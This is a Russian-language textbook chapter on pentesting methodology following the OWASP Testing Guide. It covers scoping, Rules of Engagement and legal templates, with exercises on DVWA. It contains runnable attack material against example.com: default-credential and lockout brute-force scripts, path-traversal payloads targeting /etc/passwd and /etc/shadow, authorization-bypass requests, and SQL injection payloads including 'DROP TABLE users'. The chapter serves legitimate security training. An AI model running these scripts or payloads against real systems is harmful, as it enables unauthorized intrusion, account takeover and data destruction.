# Глава 13.1: Методология пентеста: OWASP Testing Guide

## Введение

OWASP Testing Guide (OTG) — наиболее авторитетный документ по методологии тестирования безопасности веб-приложений. Версия 4.2, актуальная на момент написания, содержит более 90 тест-кейсов, структурированных по категориям.

Методология — это не набор инструментов, а систематический подход к тестированию. Хороший пентестер следует процессу, а не просто запускает сканеры.

---

## 13.1.1 Фазы тестирования по OWASP

```
┌─────────────────────────────────────────────────────────┐
│         OWASP Web Security Testing Guide v4.2           │
└─────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────┐
│  1. Информационный  │  Scope, правила взаимодействия,
│     сбор            │  юридические аспекты, контракты
└─────────────────────┘
         │
         ▼
┌─────────────────────┐
│  2. Разведка        │  OSINT, DNS, WHOIS, технологии,
│     (Recon)         │  архитектура приложения
└─────────────────────┘
         │
         ▼
┌─────────────────────┐
│  3. Конфигурация    │  Сканирование портов, настройки
│     и инфраструктура│  сервера, TLS, заголовки
└─────────────────────┘
         │
         ▼
┌─────────────────────┐
│  4. Управление      │  Регистрация, логин, логаут,
│     идентичностью   │  управление аккаунтами
└─────────────────────┘
         │
         ▼
┌─────────────────────┐
│  5. Аутентификация  │  Пароли, lockout, bypass,
│                     │  MFA, remember me
└─────────────────────┘
         │
         ▼
┌─────────────────────┐
│  6. Авторизация     │  IDOR, path traversal,
│                     │  privilege escalation
└─────────────────────┘
         │
         ▼
┌─────────────────────┐
│  7. Управление      │  Session tokens, fixation,
│     сессиями        │  hijacking, CSRF
└─────────────────────┘
         │
         ▼
┌─────────────────────┐
│  8. Валидация ввода │  XSS, SQLi, SSRF, XXE,
│                     │  Command Injection, LFI/RFI
└─────────────────────┘
         │
         ▼
┌─────────────────────┐
│  9. Обработка       │  Ошибки, исключения,
│     ошибок          │  утечка информации в ошибках
└─────────────────────┘
         │
         ▼
┌─────────────────────┐
│ 10. Криптография    │  Слабые алгоритмы, хранение
│                     │  данных, транспортный уровень
└─────────────────────┘
         │
         ▼
┌─────────────────────┐
│ 11. Бизнес-логика   │  Логика приложения, обход
│                     │  ограничений, abuse cases
└─────────────────────┘
         │
         ▼
┌─────────────────────┐
│ 12. Client-Side     │  DOM XSS, HTML Injection,
│                     │  Clickjacking, WebSockets
└─────────────────────┘
```

---

## 13.1.2 Scoping — определение области тестирования

Scope (область тестирования) — это документально зафиксированный список систем, функций и IP-адресов, которые разрешено тестировать.

### Типы scope

**In-Scope (разрешено тестировать):**
```
✓ web.example.com
✓ api.example.com  
✓ 192.168.1.0/24 (внутренняя сеть)
✓ Мобильное приложение iOS/Android
✓ Все поддомены *.example.com
✓ Авторизованные пользователи (роли: user, moderator)
```

**Out-of-Scope (запрещено тестировать):**
```
✗ Сторонние сервисы (Stripe, SendGrid, AWS)
✗ admin.example.com (обслуживается третьей компанией)
✗ Производственная база данных
✗ DoS/DDoS атаки
✗ Физическая безопасность
✗ Социальная инженерия в отношении сотрудников
✗ Сетевые устройства (роутеры, коммутаторы)
```

### Шаблон документа Rules of Engagement (ROE)

```markdown
# Rules of Engagement (ROE)
## Проект: Тестирование безопасности web.example.com

### Стороны
- Заказчик: ООО "Пример", представитель Иван Иванов
- Исполнитель: ИП Петров П.П., пентестер

### Период тестирования
- Начало: 2024-02-01 09:00 MSK
- Конец:  2024-02-15 18:00 MSK
- Тестирование только в рабочее время: 09:00-18:00 будни
  (кроме особых договорённостей для ночного тестирования)

### Scope
In-Scope:
- https://web.example.com
- https://api.example.com  
- IP: 93.184.216.0/24

Out-of-Scope:
- Все остальные системы
- DoS/DDoS атаки
- Физическая безопасность

### Методы тестирования
Разрешено:
- Сканирование портов
- Анализ уязвимостей
- Эксплуатация найденных уязвимостей (в тестовой среде)
- Социальная инженерия только с письменного разрешения

### Экстренные контакты
- Иван Иванов (CTO): +7-999-123-45-67 (24/7)
- Дежурный ИТ: +7-999-765-43-21
- Если нашли критическую уязвимость — сразу звонить!

### Конфиденциальность
Все результаты — NDA. Отчёт передаётся только заказчику.

### Подписи
____________________ Заказчик: Иванов И.И., дата: ___
____________________ Исполнитель: Петров П.П., дата: ___
```

---

## 13.1.3 Этап 1: Разведка — OTG-INFO

### OTG-INFO-001: Fingerprinting веб-сервера

```bash
# Определение типа и версии веб-сервера
curl -I https://example.com

# HTTP/2.0 200 OK
# Server: nginx/1.18.0 (Ubuntu)     <-- Версия сервера!
# X-Powered-By: PHP/7.4.3           <-- Технология!
# X-Frame-Options: SAMEORIGIN
# Content-Type: text/html

# Попытка скрыть версию (должны быть настроены):
# Server: nginx                      (хорошо)
# Server:                            (лучше)

# Whatweb — автоматический fingerprinting
whatweb https://example.com -v

# wappalyzer CLI
npm install -g @wappalyzer/cli
wappalyzer https://example.com

# BuiltWith API
curl "https://api.builtwith.com/free1/api.json?KEY=FREE&LOOKUP=example.com"
```

### OTG-INFO-002: Поиск метаданных

```bash
# robots.txt — может содержать скрытые пути
curl https://example.com/robots.txt

# Пример интересного robots.txt
# User-agent: *
# Disallow: /admin/
# Disallow: /backup/
# Disallow: /internal-api/
# Sitemap: https://example.com/sitemap.xml

# sitemap.xml — карта сайта
curl https://example.com/sitemap.xml | grep '<loc>' | sed 's/<[^>]*>//g'

# Поиск скрытых директорий в sitemap
curl https://example.com/sitemap.xml | \
    python3 -c "
import sys, re
content = sys.stdin.read()
urls = re.findall(r'<loc>(.*?)</loc>', content)
for url in urls:
    print(url)
"

# security.txt — контакт для уязвимостей
curl https://example.com/.well-known/security.txt

# Crossdomain.xml (Flash, но индикатор настройки CORS)
curl https://example.com/crossdomain.xml
```

### OTG-INFO-003: Fingerprinting приложения

```bash
# Определение CMS
# WordPress
curl https://example.com/wp-login.php -I
curl https://example.com/wp-admin/ -I
curl https://example.com/readme.html

# Joomla
curl https://example.com/administrator/

# Drupal
curl https://example.com/sites/default/settings.php

# Автоматическое определение
nikto -h https://example.com -Tuning 3  # Information disclosure

# WPScan для WordPress
wpscan --url https://example.com
wpscan --url https://example.com --enumerate p,t,u  # plugins, themes, users
wpscan --url https://example.com --api-token YOUR_TOKEN

# CMSmap — универсальный
cmsmap https://example.com
```

---

## 13.1.4 Этап 2: Конфигурация — OTG-CONFIG

### OTG-CONFIG-001: Network/Infrastructure Configuration

```bash
# Тестирование TLS
# testssl.sh — полный анализ TLS
git clone https://github.com/drwetter/testssl.sh
./testssl.sh https://example.com

# sslyze
sslyze --regular example.com
sslyze --heartbleed example.com  # Проверка Heartbleed

# nmap SSL-скрипты
nmap --script=ssl-enum-ciphers -p 443 example.com

# Ожидаемые результаты:
# TLS 1.0/1.1 — должны быть отключены (уязвимы BEAST, POODLE)
# TLS 1.2/1.3 — хорошо
# RC4 — устаревший, небезопасный
# DES, 3DES — устаревшие

# Проверка HTTP Security Headers
curl -I https://example.com 2>/dev/null | grep -i \
    "Strict-Transport-Security\|Content-Security-Policy\|X-Frame-Options\|X-Content-Type-Options\|X-XSS-Protection\|Referrer-Policy\|Permissions-Policy"

# Инструмент securityheaders.com
curl "https://securityheaders.com/?q=example.com&followRedirects=on&hide=on" -L | \
    grep -o 'Grade: [A-F+]*'
```

### Чеклист Security Headers

| Заголовок | Рекомендуемое значение | Риск отсутствия |
|-----------|------------------------|-----------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | MITM атаки |
| `Content-Security-Policy` | Настраивается под приложение | XSS |
| `X-Frame-Options` | `DENY` или `SAMEORIGIN` | Clickjacking |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Утечка URL |
| `Permissions-Policy` | Ограничение API | Злоупотребление API |
| `X-XSS-Protection` | `1; mode=block` | XSS (устаревший) |

---

## 13.1.5 Этап 3: Аутентификация — OTG-AUTHN

### OTG-AUTHN-001: Credentials Transported over Encrypted Channel

```bash
# Проверка передачи через HTTP (не HTTPS)
curl -v http://example.com/login 2>&1 | grep -i "location\|set-cookie"

# Перехват через Wireshark
# Фильтр: http.request.method == "POST" && http.request.uri contains "login"

# Проверка атрибутов Cookie
curl -I https://example.com/login 2>&1 | grep -i "set-cookie"
# Нужно: Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict
# Плохо: Set-Cookie: session=abc (без флагов!)
```

### OTG-AUTHN-002: Default Credentials

```bash
# Проверка стандартных учётных данных
# Список: admin/admin, admin/password, root/root, test/test

python3 << 'PYTHON'
import requests

url = "https://example.com/login"
default_creds = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "12345"),
    ("administrator", "administrator"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("user", "user"),
    ("guest", "guest"),
]

for username, password in default_creds:
    r = requests.post(url, data={
        "username": username,
        "password": password
    }, allow_redirects=False)
    
    if r.status_code in [200, 302] and "logout" in r.headers.get("Location", "").lower():
        print(f"[!] Default credentials work: {username}:{password}")
    else:
        print(f"[-] {username}:{password} - {r.status_code}")
PYTHON
```

### OTG-AUTHN-003: Account Lockout

```bash
# Проверка блокировки аккаунта
python3 << 'PYTHON'
import requests
import time

url = "https://example.com/login"
username = "admin"  # Или известное имя пользователя

print(f"Testing account lockout for: {username}")

for attempt in range(15):
    r = requests.post(url, data={
        "username": username,
        "password": f"wrong_password_{attempt}"
    })
    
    print(f"Attempt {attempt+1}: Status {r.status_code}")
    
    if "locked" in r.text.lower() or "blocked" in r.text.lower():
        print(f"[+] Account locked after {attempt+1} attempts")
        break
    
    if attempt == 14:
        print("[!] No account lockout after 15 attempts!")
    
    time.sleep(0.5)
PYTHON
```

---

## 13.1.6 Этап 4: Авторизация — OTG-AUTHZ

### OTG-AUTHZ-001: Directory Traversal

```bash
# Проверка path traversal в параметрах
# Классические payloads

TRAVERSAL_PAYLOADS=(
    "../../../../etc/passwd"
    "../../../../etc/shadow"
    "../../../../Windows/System32/drivers/etc/hosts"
    "..%2F..%2F..%2Fetc%2Fpasswd"        # URL-encoded
    "..%252F..%252Fetc%252Fpasswd"        # Double-encoded
    "....//....//etc/passwd"              # Filter bypass
    "..\\..\\..\\Windows\\win.ini"        # Windows
    "/etc/passwd"                         # Absolute path
    "file:///etc/passwd"                  # File protocol
)

for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
    echo -n "Testing: $payload ... "
    result=$(curl -s "https://example.com/download?file=$payload" | head -c 100)
    if echo "$result" | grep -q "root:"; then
        echo "[VULNERABLE!]"
        echo "  Response: $result"
    else
        echo "Not vulnerable"
    fi
done

# В Python с Burp Suite интеграцией
python3 << 'PYTHON'
import requests

payloads = [
    "../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "....//....//etc/passwd",
    "/etc/passwd",
]

url = "https://example.com/view"
params = ["file", "path", "page", "include", "doc", "name"]

for param in params:
    for payload in payloads:
        r = requests.get(url, params={param: payload})
        if "root:" in r.text or "bin/bash" in r.text:
            print(f"[CRITICAL] LFI found! Param: {param}, Payload: {payload}")
            print(f"  Response: {r.text[:200]}")
PYTHON
```

### OTG-AUTHZ-002: Bypass Authorization Schema

```bash
# Тест на горизонтальное повышение привилегий
# Пользователь 1 пытается получить данные пользователя 2

# Без авторизации
curl https://example.com/api/users/2/profile

# С авторизацией другого пользователя
curl -H "Authorization: Bearer USER1_TOKEN" \
     https://example.com/api/users/2/profile

# Тест на вертикальное повышение привилегий
# Обычный пользователь пытается выполнить admin-действия
curl -H "Authorization: Bearer USER_TOKEN" \
     https://example.com/api/admin/users

# Обход авторизации через манипуляцию URL
# Добавление path traversal
curl https://example.com/admin/../user/profile
curl https://example.com/admin/%2e%2e/user/profile

# Добавление параметра admin=true
curl "https://example.com/profile?admin=true"
curl "https://example.com/profile?role=admin"

# HTTP Method Override
curl -X POST \
     -H "X-HTTP-Method-Override: DELETE" \
     -H "Authorization: Bearer USER_TOKEN" \
     https://example.com/api/admin/users/5
```

---

## 13.1.7 Этап 5: Валидация ввода — OTG-INPVAL

### Чеклист уязвимостей ввода

```
OTG-INPVAL-001  Reflected XSS
OTG-INPVAL-002  Stored XSS
OTG-INPVAL-003  HTTP Verb Tampering
OTG-INPVAL-004  HTTP Parameter Pollution
OTG-INPVAL-005  SQL Injection
OTG-INPVAL-006  LDAP Injection
OTG-INPVAL-007  ORM Injection
OTG-INPVAL-008  XML Injection
OTG-INPVAL-009  SSI Injection
OTG-INPVAL-010  XPath Injection
OTG-INPVAL-011  IMAP/SMTP Injection
OTG-INPVAL-012  Code Injection
OTG-INPVAL-013  Command Injection
OTG-INPVAL-014  Buffer Overflow
OTG-INPVAL-015  HTTP Splitting/Smuggling
OTG-INPVAL-016  HTTP Incoming Requests
OTG-INPVAL-017  Local File Inclusion
OTG-INPVAL-018  Remote File Inclusion
OTG-INPVAL-019  SSRF
OTG-INPVAL-020  SSTI
```

### OTG-INPVAL-005: SQL Injection Testing

```python
#!/usr/bin/env python3
"""SQL Injection Detection"""
import requests

SQL_PAYLOADS = {
    "boolean": [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "\" OR \"1\"=\"1",
        "1 OR 1=1",
    ],
    "error": [
        "'",
        "''",
        "`",
        "'\"",
        "\\",
        "%27",
        "' AND 1=CONVERT(int, '1')--",  # MSSQL
        "' AND 1=1 UNION SELECT NULL--",
    ],
    "time": [
        "'; WAITFOR DELAY '0:0:5'--",          # MSSQL
        "' OR SLEEP(5)--",                      # MySQL
        "' OR pg_sleep(5)--",                   # PostgreSQL
        "' OR 1=1 AND SLEEP(5)--",
    ],
    "stacked": [
        "'; DROP TABLE users--",
        "'; INSERT INTO users(username,password) VALUES('hacker','pass')--",
    ]
}

def test_sqli(url, params):
    for category, payloads in SQL_PAYLOADS.items():
        for payload in payloads:
            for param in params:
                test_data = {k: "normal_value" for k in params}
                test_data[param] = payload
                
                try:
                    r = requests.get(url, params=test_data, timeout=10)
                    
                    error_patterns = [
                        "sql syntax", "mysql_fetch", "ora-", 
                        "microsoft ole db", "odbc drivers", "warning: mysql",
                        "postgresql", "sqlite", "unclosed quotation"
                    ]
                    
                    for pattern in error_patterns:
                        if pattern in r.text.lower():
                            print(f"[!] SQL Error detected! Param: {param}, Payload: {payload}")
                            print(f"    Pattern: {pattern}")
                            break
                except Exception as e:
                    print(f"Error: {e}")

# Использование
test_sqli("https://example.com/search", ["q", "category", "id"])
```

---

## 13.1.8 Документирование в процессе тестирования

Качественная документация — залог хорошего отчёта. Документировать нужно в процессе, а не после.

### Структура рабочих заметок

```markdown
# Тест: example.com
## Дата: 2024-02-01
## Тестировщик: Иван Петров

---

## 14:30 - Обнаружена SQL-инъекция в /search

### Описание
Параметр `q` на странице поиска уязвим к Error-Based SQL Injection.

### Воспроизведение
1. Перейти на: https://example.com/search
2. Ввести в поле поиска: `' OR 1=1--`
3. Нажать "Поиск"

### Запрос (сырой HTTP)
```
GET /search?q=%27+OR+1%3D1-- HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

### Ответ
```
HTTP/1.1 500 Internal Server Error

Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result,
bool given in /var/www/html/search.php on line 42
```

### Скриншоты
- [screen_1.png] — Запрос в Burp Suite
- [screen_2.png] — Ответ с ошибкой SQL

### Серьёзность
**High** (CVSS: 8.1)

### Рекомендация
Использовать подготовленные запросы (PDO/MySQLi с параметрами).
```

### Сохранение доказательств

```bash
# Автоматическое создание структуры доказательств
mkdir -p evidence/{screenshots,requests,responses,logs}

# Сохранение HTTP-запросов из curl
curl -v "https://example.com/search?q='+OR+1=1--" 2>&1 | tee evidence/requests/sqli_test.txt

# Захват трафика с Wireshark (командная строка)
tshark -i eth0 -f "host example.com" -w evidence/logs/traffic.pcap

# Скриншоты с gowitness
gowitness single --url "https://example.com" --screenshot-path evidence/screenshots/

# Сохранение исходного кода страницы
curl -s https://example.com/vulnerable_page > evidence/responses/page_source.html
```

---

## 13.1.9 Юридические аспекты тестирования

### Законодательство

| Страна   | Закон                                              | Статья          |
|----------|----------------------------------------------------|-----------------|
| РФ       | УК РФ                                              | Ст. 272, 273, 274 |
| РФ       | ФЗ "Об информации..."                              | 149-ФЗ          |
| США      | Computer Fraud and Abuse Act (CFAA)                | 18 U.S.C. § 1030 |
| ЕС       | Directive on Attacks Against Information Systems   | 2013/40/EU      |
| Украина  | УК Украины                                         | Ст. 361-363     |

### Что должно быть до начала тестирования

```
□ Письменное разрешение от владельца системы
□ Подписанный договор/NDA
□ Rules of Engagement (ROE)
□ Scope - точный список разрешённых систем
□ Контактная информация для экстренной связи
□ Страховка (в идеале - E&O Insurance)
□ Временные рамки тестирования
□ Правила эскалации критических находок
```

### Шаблон авторизационного письма

```
АВТОРИЗАЦИОННОЕ ПИСЬМО

Настоящим документом ООО "Пример" (далее — Заказчик)
разрешает [Имя пентестера/Компания] проводить тестирование
безопасности следующих систем:

РАЗРЕШЁННЫЕ СИСТЕМЫ:
- web.example.com (IP: 93.184.216.34)
- api.example.com (IP: 93.184.216.35)
- Диапазон IP: 192.168.1.0/24

ПЕРИОД ТЕСТИРОВАНИЯ:
С: 2024-02-01
По: 2024-02-15

РАЗРЕШЁННЫЕ ДЕЙСТВИЯ:
- Сканирование портов и сервисов
- Тестирование на уязвимости
- Попытки эксплуатации (только в тестовой среде)

ОГРАНИЧЕНИЯ:
- Не проводить DoS атаки
- Не изменять данные в производственной БД
- Немедленно сообщать о критических находках

Представитель Заказчика: ____________________ 
Должность: CTO
Дата: 2024-01-31

Печать: [Печать организации]
```

---

## Итоги главы

В этой главе мы разобрали:

- **Структуру OWASP Testing Guide v4.2** — 12 фаз тестирования
- **Scoping и ROE** — как правильно определить область тестирования
- **Каждую фазу тестирования** — от разведки до клиентских атак
- **Документирование** — как вести записи в процессе тестирования
- **Юридические аспекты** — что должно быть оформлено до начала работ

### Принцип PTES (Penetration Testing Execution Standard)

1. **Pre-engagement** — подготовка, scoping
2. **Intelligence Gathering** — разведка
3. **Threat Modeling** — моделирование угроз
4. **Vulnerability Analysis** — анализ уязвимостей
5. **Exploitation** — эксплуатация
6. **Post-Exploitation** — закрепление, латеральное движение
7. **Reporting** — отчётность

---

## Практические задания

### Задание 1: Составление чеклиста
Составьте персональный чеклист тестирования для WordPress-сайта, включая:
- Проверку конфигурации сервера
- Тесты аутентификации
- Проверку плагинов на уязвимости
- API-тесты (REST API WordPress)

### Задание 2: ROE документ
Составьте полный ROE-документ для условного проекта:
- Компания: интернет-магазин с 50k пользователей
- Системы: веб-сайт, мобильное API, панель администратора
- Требования: без влияния на доступность, только в рабочее время

### Задание 3: Тестовый план
Разработайте методологию тестирования для REST API финтех-приложения:
- Определите приоритеты тестирования
- Составьте список конкретных тест-кейсов
- Укажите инструменты для каждого этапа

### Задание 4: Практическое тестирование
На DVWA (Docker):
```bash
docker run -d -p 80:80 vulnerables/web-dvwa
```
Пройдите все фазы OWASP Testing Guide:
- Разведка (fingerprinting, robots.txt)
- Аутентификация (default creds, brute force)
- SQL Injection (все типы)
- XSS (Reflected, Stored, DOM)
- Задокументируйте каждую находку

### Задание 5: Создание шаблонов
Создайте набор шаблонов для пентест-проекта:
- Шаблон ROE
- Шаблон рабочих заметок
- Шаблон описания уязвимости
- Чеклист завершения тестирования

